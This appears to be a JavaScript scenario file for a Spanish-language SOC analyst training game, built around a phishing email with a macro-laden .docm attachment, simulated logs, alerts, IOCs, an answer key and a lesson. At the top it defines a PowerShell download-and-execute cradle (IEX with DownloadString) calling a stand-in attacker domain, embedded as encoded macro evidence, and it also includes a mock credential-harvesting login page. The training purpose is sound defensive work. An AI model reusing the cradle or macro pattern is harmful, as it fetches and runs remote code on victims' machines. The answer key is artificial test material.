import { psEnc } from "./helpers.js";

// Comando PowerShell oculto en la macro del documento
const cmdPS =
  "IEX(New-Object Net.WebClient).DownloadString('http://acme-facturas.info/payment.exe')";
const encPS = psEnc(cmdPS);

export default {
  id: "phishing-01",
  titulo: "«Factura pendiente» — Phishing con macro de Office",
  severidad: "ALTA",
  nivel: 1,
  sla: 900, // 15 minutos
  xp: 260,
  briefing:
    "La pasarela de correo ha marcado un mensaje como sospechoso y ha alertado al SOC. " +
    "Varios usuarios pueden haberlo abierto. Tu tarea: analizar el correo, determinar si es " +
    "una amenaza real, identificar los indicadores de compromiso (IOC) y responder.\n\n" +
    "Empieza leyendo el correo con `mail` y revisa las alertas con `alertas`.\n" +
    "Consejo: `ayuda` lista todos los comandos disponibles.",

  fs: {
    "/var/log/mail.log": [
      "Feb 10 08:31:02 mx01 postfix/smtpd[22104]: connect from mail.acme-facturas.info[185.220.101.34]",
      "Feb 10 08:31:04 mx01 postfix/smtpd[22104]: 6A2F1B0042: client=mail.acme-facturas.info[185.220.101.34]",
      "Feb 10 08:31:04 mx01 postfix/smtpd[22104]: 6A2F1B0042: SPF: FAIL (no SPF record for acme-facturas.info)",
      "Feb 10 08:31:05 mx01 postfix/smtpd[22104]: 6A2F1B0042: DKIM: NONE (no signature)",
      "Feb 10 08:31:05 mx01 postfix/smtpd[22104]: 6A2F1B0042: DMARC: NONE (no policy published)",
      "Feb 10 08:31:06 mx01 postfix/smtpd[22104]: 6A2F1B0042: 550 5.7.1 Message rejected by policy: suspected phishing (lookalike domain)",
      "Feb 10 08:31:06 mx01 postfix/smtpd[22104]: 6A2F1B0042: lost connection after DATA from mail.acme-facturas.info[185.220.101.34]",
      "Feb 10 08:31:07 mx01 postfix/smtpd[22104]: disconnect from mail.acme-facturas.info[185.220.101.34]",
      "Feb 10 08:31:12 mx01 postfix/smtpd[22104]: connect from mail2.bizmail-eu.net[91.214.124.77]",
      "Feb 10 08:31:14 mx01 postfix/smtpd[22104]: 8C31D0B0AA: client=mail2.bizmail-eu.net[91.214.124.77]",
      "Feb 10 08:31:14 mx01 postfix/smtpd[22104]: 8C31D0B0AA: SPF: PASS (bizmail-eu.net) — correo legítimo",
      "Feb 10 08:31:15 mx01 postfix/smtpd[22104]: 8C31D0B0AA: message accepted: to=<m.garcia@acme.com>",
    ].join("\n"),

    "/opt/siem/alerts.json": JSON.stringify(
      [
        {
          id: "ALT-201",
          sev: "HIGH",
          fuente: "correo_seguro",
          ts: "2026-02-10T08:31:06Z",
          titulo: "Dominio suplantado detectado en correo entrante",
          detalle:
            "Mensaje con dominio lookalike 'acme-facturas.info' (similar a acme.com). Adjunto .docm con macros. Rechazado por política, pero remitente podría haber intentado envío directo a usuarios.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-202",
          sev: "MEDIUM",
          fuente: "edr",
          ts: "2026-02-10T08:47:22Z",
          titulo: "Documento con macros abierto en HOST-104",
          detalle:
            "m.garcia abrió 'factura_0824.docm' desde el correo. Las macros estaban habilitadas. El proceso WINWORD.EXE ejecutó powershell.exe (comportamiento inusual).",
          estado: "ABIERTA",
        },
        {
          id: "ALT-203",
          sev: "MEDIUM",
          fuente: "proxy",
          ts: "2026-02-10T08:48:05Z",
          titulo: "Descarga de ejecutable desde dominio de baja reputación",
          detalle:
            "HOST-104 (m.garcia) solicitó http://acme-facturas.info/payment.exe. Dominio registrado hace 2 días.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-204",
          sev: "LOW",
          fuente: "dns",
          ts: "2026-02-10T08:48:11Z",
          titulo: "Resolución de dominio sospechoso",
          detalle: "acme-facturas.info → 185.220.101.34 (AS 44477, infraestructura de hosting de alto riesgo).",
          estado: "ABIERTA",
        },
      ],
      null,
      2
    ),

    "/home/analista/casos/evidencias/factura_0824.docm": [
      "PK\u0003\u0004\u0014\u0000\u0006\u0000\b\u0000\u0000\u0000!\u0000",
      "word/document.xml\u0000\u0000\u0000\u0000",
      "AutoOpen()\u0000Sub AutoOpen()\u0000CreateObject(\"WScript.Shell\").Run",
      // La cadena -enc aparece aislada para que `strings` la muestre completa
      "powershell.exe -enc \u0000" + encPS + "\u0000",
      "word/vbaProject.bin\u0000\u0000\u0000\u0000\u0000",
      "End Sub\u0000Document_Open\u0000MSHTA\u0000",
      "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
    ].join("\u0000"),

    "/home/analista/casos/evidencias/headers.txt": [
      "Return-Path: <facturacion@acme-facturas.info>",
      "Received: from mail.acme-facturas.info (185.220.101.34) by mx01.acme.com",
      "From: \"Facturacion ACME\" <facturacion@acme-facturas.info>",
      "To: m.garcia@acme.com, r.moreno@acme.com, l.ortiz@acme.com",
      "Reply-To: soporte@paypal-verifica.top",
      "Subject: Factura pendiente de pago #88231",
      "Date: Tue, 10 Feb 2026 08:30:55 +0100",
      "MIME-Version: 1.0",
      "Content-Type: multipart/mixed; boundary=\"=_b6f1a2\"",
      "Message-ID: <20260210083055.9f2c1a@mail.acme-facturas.info>",
      "X-Mailer: Microsoft Outlook Express 6.00.2900.5931",
      "",
      "Nota del analista:",
      "  - El dominio real de la empresa es acme.com, no acme-facturas.info.",
      "  - La dirección de facturación legítima es facturacion@acme.com.",
      "  - Outlook Express 6 es un cliente de 2003: señuelo típico en campañas.",
    ].join("\n"),

    "/var/log/proxy.log": [
      "Feb 10 08:47:45 squid[1044]: 10.0.4.104 - GET http://acme-facturas.info/ - TCP_MISS/200 text/html",
      "Feb 10 08:47:52 squid[1044]: 10.0.4.104 - GET http://acme-facturas.info/login.php - TCP_MISS/200 text/html",
      "Feb 10 08:48:05 squid[1044]: 10.0.4.104 - GET http://acme-facturas.info/payment.exe - TCP_MISS/302 text/html",
      "Feb 10 08:52:30 squid[1044]: 10.0.4.104 - GET http://www.google.es/ - TCP_MISS/200 text/html",
    ].join("\n"),

    "/var/log/dns.log": [
      "Feb 10 08:47:44 dns01 queries: client 10.0.4.104#53000: query: acme-facturas.info IN A",
      "Feb 10 08:48:04 dns01 queries: client 10.0.4.104#53000: query: acme-facturas.info IN A",
      "Feb 10 08:48:05 dns01 queries: client 10.0.4.104#53000: query: acme-facturas.info IN A",
      "Feb 10 08:48:09 dns01 queries: client 10.0.4.104#53000: query: acme-facturas.info IN A",
    ].join("\n"),

    "/home/analista/casos/evidencias/README.txt":
      "Evidencias del caso #CASE-1042 (phishing).\n" +
      "  - headers.txt     : cabeceras del correo original\n" +
      "  - factura_0824.docm: adjunto sospechoso (NO ejecutar)\n" +
      "Investiga con: strings, file, decode, whois, dig, curl, vt",
  },

  correos: [
    {
      id: 1,
      de: "facturacion@acme-facturas.info",
      para: "m.garcia@acme.com, r.moreno@acme.com, l.ortiz@acme.com",
      asunto: "Factura pendiente de pago #88231",
      fecha: "10 Feb 2026 08:30",
      estado: "LEÍDO (abierto por m.garcia)",
      adjunto: "factura_0824.docm (48 KB)",
      headers: "/home/analista/casos/evidencias/headers.txt",
      cuerpo: [
        "Hola,",
        "",
        "Le recordamos que la factura #88231 con vencimiento inmediato sigue pendiente de pago.",
        "Adjuntamos el documento con los datos bancarios actualizados.",
        "",
        "Un saludo,",
        "Departamento de Facturación — ACME Corp",
        "",
        "------------------------------------------------------------------",
        "[Marca de la pasarela de correo]",
        "⚠ Este mensaje NO pasó los controles de autenticación (SPF/DKIM/DMARC).",
        "⚠ Dominio remitente: acme-facturas.info (NO es acme.com).",
      ].join("\n"),
    },
    {
      id: 2,
      de: "newsletter@amazon.es",
      para: "m.garcia@acme.com",
      asunto: "Tus novedades de esta semana",
      fecha: "9 Feb 2026 18:12",
      estado: "NO LEÍDO",
      adjunto: "ninguno",
      cuerpo: "Boletín de novedades de Amazon.es. Puedes darte de baja en el enlace del pie.",
    },
  ],

  alertas: [
    { id: "ALT-201", sev: "HIGH", fuente: "correo_seguro", titulo: "Dominio suplantado detectado en correo entrante" },
    { id: "ALT-202", sev: "MEDIUM", fuente: "edr", titulo: "Documento con macros abierto en HOST-104" },
    { id: "ALT-203", sev: "MEDIUM", fuente: "proxy", titulo: "Descarga de ejecutable desde dominio de baja reputación" },
    { id: "ALT-204", sev: "LOW", fuente: "dns", titulo: "Resolución de dominio sospechoso" },
  ],

  dominios: {
    "acme-facturas.info": {
      ip: "185.220.101.34",
      registrado: "Hace 2 días (08 Feb 2026)",
      registrador: "Njalla (registrador anónimo de alto riesgo)",
      whois: [
        "Domain: acme-facturas.info",
        "Registrar: Njal.la (anonimizador) - riesgo alto",
        "Registered: 2026-02-08 (hace 2 DÍAS)",
        "Registrant: Privacy Protection (datos ocultos)",
        "Name Server: ns1.hostanon.net, ns2.hostanon.net",
        "IP actual: 185.220.101.34",
        "ASN: AS44477 - STARK INDUSTRIES SOLUTIONS (hosting tolerante con malware)",
        "Nota: dominio registrado para imitar a acme.com. Suplantación clara.",
      ].join("\n"),
      vt: {
        repos: 18,
        maliciosos: 16,
        deteccion: "MALICIOSO (16/18)",
        comentarios: "Asociado a campañas de phishing con adjuntos .docm y descarga de payloads.",
      },
    },
    "acme.com": {
      ip: "203.0.113.10",
      registrado: "Hace 22 años",
      registrador: "MarkMonitor Inc.",
      whoi: "Dominio legítimo de ACME Corp. Nada que ver con acme-facturas.info.",
      vt: { repos: 90, maliciosos: 0, deteccion: "LIMPIO (0/90)" },
    },
  },

  ips: {
    "185.220.101.34": {
      pais: "🇩🇪 Alemania (anonimizador)",
      asn: "AS44477",
      reputacion: "MALICIOSA — listada en 9 blacklists (Spamhaus, AbuseIPDB, ...)",
      whois: "Red asignada a proveedor de hosting de alto riesgo. Sin registrante real.",
    },
    "91.214.124.77": {
      pais: "🇳🇱 Países Bajos",
      asn: "AS50673",
      reputacion: "OK — proveedor de correo legítimo (bizmail-eu.net)",
    },
  },

  urls: {
    "http://acme-facturas.info/": [
      "<!DOCTYPE html>",
      "<html><head><title>Iniciar sesión — Portal ACME</title></head>",
      "<body>",
      "  <h1>Portal de empleados</h1>",
      "  <form action=\"login.php\" method=\"post\">",
      "    <input type=\"text\" name=\"user\" placeholder=\"usuario@acme.com\">",
      "    <input type=\"password\" name=\"pass\" placeholder=\"Contraseña\">",
      "    <button type=\"submit\">Entrar</button>",
      "  </form>",
      "  <!-- Página falsa: el dominio NO es acme.com -->",
      "</body></html>",
    ].join("\n"),
    "http://acme-facturas.info/login.php":
      "302 Found — redirige a http://acme-facturas.info/ (robo de credenciales).",
    "http://acme-facturas.info/payment.exe":
      "HTTP/1.1 404 Not Found — el servidor ya no ofrece el archivo (el dominio sigue activo).",
  },

  hashes: {
    a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef: {
      nombre: "payment.exe",
      tipo: "SHA-256",
      vt: { repos: 32, maliciosos: 28, deteccion: "MALICIOSO (28/32)", familia: "Remcos RAT" },
      nota: "Trojan de acceso remoto (RAT). Se ejecuta en segundo plano y permite control remoto del equipo.",
    },
  },

  // Archivos locales cuyo hash (calculado con md5sum/sha256sum) se puede
  // consultar en VirusTotal (`vt <hash>`)
  archivosVt: {
    "/home/analista/casos/evidencias/factura_0824.docm": {
      nombre: "factura_0824.docm",
      familia: "Trojan.Downloader (macro maliciosa)",
      deteccion: "MALICIOSO (38/62)",
      nota: "Documento con macro AutoOpen que ejecuta PowerShell para descargar Remcos RAT.",
    },
  },

  correctas: {
    bloquear: [
      "dominio:acme-facturas.info",
      "ip:185.220.101.34",
      "url:http://acme-facturas.info/payment.exe",
      "dominio:paypal-verifica.top",
    ],
    aislar: ["host:HOST-104"],
    deshabilitar: ["usuario:m.garcia"],
    escalar: true,
    cerrar: false,
  },

  incorrectas: [
    "bloquear|dominio:acme.com",
    "aislar|host:HOST-101",
    "deshabilitar|usuario:r.moreno",
  ],

  eventos: [
    {
      en: 300,
      tipo: "alerta",
      sev: "HIGH",
      titulo: "Conexiones salientes desde HOST-104",
      detalle: "El proceso powershell.exe de HOST-104 mantiene conexión con 185.220.101.34:443. Riesgo de exfiltración.",
    },
    {
      en: 600,
      tipo: "msg",
      titulo: "Recordatorio del supervisor",
      detalle: "«¿Cómo va ese correo sospechoso? Recuerda: identificar, contener y escalar. Si tienes dudas, pide pista.»",
    },
  ],

  pistas: [
    "Revisa los correos (`mail`) y las alertas (`alertas`). El adjunto es un .docm: usa `strings` y `decode` sobre él.",
    "El dominio del remitente no pertenece a la empresa. Comprueba `whois acme-facturas.info` y `dig`.",
    "La macro ejecuta un comando PowerShell. Decodifícalo: `decode SQBFAFgA...` (verás la URL real).",
    "Responde: bloquea el dominio y la IP, aísla el host afectado y deshabilita la cuenta comprometida. Después escribe el `informe`.",
  ],

  leccion: {
    titulo: "Phishing con macro: anatomía de un ataque",
    mitre: ["T1566.001", "T1204.002", "T1059.001", "T1105"],
    resumen:
      "El atacante envió un correo imitando a facturación con un dominio casi idéntico (acme-facturas.info). " +
      "El adjunto .docm contenía una macro que, al abrirse, ejecutaba PowerShell para descargar un RAT (Remcos). " +
      "El usuario m.garcia abrió el archivo y habilitó las macros: primer eslabón de la cadena.",
    deteccion:
      "- Cabeceras de correo: SPF/DKIM/DMARC fallidos o ausentes.\n" +
      "- Dominio lookalike: compáralo con el dominio oficial (acme.com vs acme-facturas.info).\n" +
      "- Adjuntos .docm/.xlsm con macros: sospecha inmediata si no se esperaban.\n" +
      "- Comportamiento: WINWORD.EXE lanzando powershell.exe es una señal roja clásica (Living Off the Land).\n" +
      "- Cadenas base64 '-enc': los atacantes ofuscan comandos; decodifícalas siempre.",
    respuesta:
      "1. Bloquea el dominio y la IP del remitente en la pasarela/firewall.\n" +
      "2. Aísla el host afectado de la red (no lo apagues: conserva evidencias).\n" +
      "3. Deshabilita la cuenta comprometida y rota credenciales.\n" +
      "4. Busca otros usuarios que hayan recibido el mismo correo (To: m.garcia, r.moreno, l.ortiz).\n" +
      "5. Escala a TI/SOC N2 para análisis forense del host y del ejecutable.",
    aprendizaje: [
      "Nunca confíes en el nombre mostrado del remitente: verifica el dominio real y las cabeceras.",
      "Los adjuntos con macros y los ejecutables descargados son el vector nº1 de entrada.",
      "Documenta SIEMPRE los IOCs: dominio, IP, hash y URL. Son tu entregable principal.",
      "Un buen analista de triage no necesita saberlo todo: necesita saber DÓNDE mirar.",
    ],
    glosario: ["SPF", "DKIM", "DMARC", "Phishing", "Macro", "RAT", "IOC", "Lookalike"],
  },
};
